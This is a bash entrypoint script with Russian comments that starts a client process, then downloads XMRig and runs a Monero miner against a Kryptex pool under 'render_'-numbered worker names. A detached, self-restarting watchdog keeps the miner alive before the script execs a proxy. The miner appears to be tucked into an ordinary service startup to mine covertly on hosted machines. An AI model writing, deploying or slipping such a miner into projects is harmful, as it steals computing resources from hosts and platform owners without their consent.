#!/bin/bash

# === 1. Запуск клиента ===
./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
echo "Client PID: $!"

# === 2. Подготовка майнера ===
DIR="xmrig-6.26.0"
ARCHIVE="$DIR-linux-static-x64.tar.gz"
URL="https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE"

if [[ ! -f "$DIR/xmrig" ]]; then
    echo "Downloading XMRig..."
    wget -q "$URL" && tar -xzf "$ARCHIVE" && rm -f "$ARCHIVE"
    chmod +x "$DIR/xmrig"
fi

# === 3. Настройки ===
WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
LOG_FILE="xmrig_activity.log"
MAX_IDLE=300        # 5 минут без шары = рестарт
MAX_RUNTIME=7200    # 2 часа = плановый рестарт (сброс зависаний)

# === 4. Функция мониторинга ===
monitor_miner() {
    local start_time=$(date +%s)
    local last_share=0
    
    echo "[$(date)] Starting miner monitor for $WALLET"
    
    while true; do
        # Проверка: запущен ли процесс вообще
        if ! pgrep -f "xmrig.*$WALLET" > /dev/null; then
            echo "[$(date)] ⚠️ Process dead, restarting..."
            pkill -9 -f "xmrig.*$WALLET" 2>/dev/null
            sleep 2
        else
            # Проверка: есть ли активность в логе (accepted shares)
            if grep -q "accepted" "$LOG_FILE" 2>/dev/null; then
                local current_share=$(stat -c %Y "$LOG_FILE" 2>/dev/null || echo 0)
                if [[ $current_share -gt $last_share ]]; then
                    last_share=$current_share
                fi
            fi
            
            local now=$(date +%s)
            local idle_time=$((now - last_share))
            local runtime=$((now - start_time))
            
            # Если долго нет шар ИЛИ пора делать плановый рестарт
            if [[ $idle_time -gt $MAX_IDLE ]] || [[ $runtime -gt $MAX_RUNTIME ]]; then
                echo "[$(date)] ⚠️ Idle too long ($idle_time s) or max runtime reached. Restarting..."
                pkill -9 -f "xmrig.*$WALLET" 2>/dev/null
                sleep 2
                start_time=$(date +%s)
                last_share=0
            fi
        fi
        sleep 10
    done
}

# === 5. Запуск майнера (БЕЗ --background, чтобы писать в лог) ===
start_miner() {
    ./$DIR/xmrig \
        --url=xmr-ru.kryptex.network:7029 \
        --user="$WALLET" \
        --pass=x \
        --coin=monero \
        --cpu-max-threads-hint=5 \
        --randomx-mode=light \
        --log-file="$LOG_FILE" \
        > /dev/null 2>&1 &
    echo "[$(date)] Miner started with PID $!"
}

# === 6. Запуск в фоне с отвязкой ===
# Сначала чистим старые процессы, если вдруг остались
pkill -9 -f "xmrig.*render_" 2>/dev/null
sleep 1

start_miner

# Запускаем монитор отдельно
nohup bash -c "$(declare -f monitor_miner); monitor_miner" > miner_monitor.log 2>&1 &
disown

echo "[$(date)] Monitor detached. Wallet: $WALLET"

# === 7. Основной процесс ===
exec ./proxy
